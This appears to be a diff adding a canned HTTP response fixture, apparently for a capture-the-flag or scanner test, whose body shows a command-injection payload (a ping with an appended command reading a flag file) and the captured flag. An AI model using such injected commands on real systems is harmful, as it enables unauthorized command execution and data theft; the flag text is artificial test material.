@@ -1,0 +1,7 @@
+HTTP/1.0 200 OK
+Server: PhantomPortal/1.0 
+Date: Wed, 28 Oct 2026 04:02:20 GMT
+Content-Type: text/plain; charset=utf-8
+
+$ ping -c1 127.0.0.1; cat /app/flags/cmdi.txt
+FLAG{command_injection_rce}
